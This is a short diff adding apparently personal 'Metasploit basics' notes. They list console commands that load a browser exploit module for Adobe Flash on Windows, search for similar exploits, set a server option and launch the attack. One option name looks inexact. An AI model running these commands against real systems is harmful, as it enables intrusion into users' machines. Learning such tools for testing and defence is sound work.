@@ -1,0 +1,10 @@
+# Metasploit basics
+use exploit/windows/browser/adobe_flash_avm2
+show options
+show payloads
+show targets
+
+search type:exploit platform:windows flash
+set SRV 80
+exploit
+-----
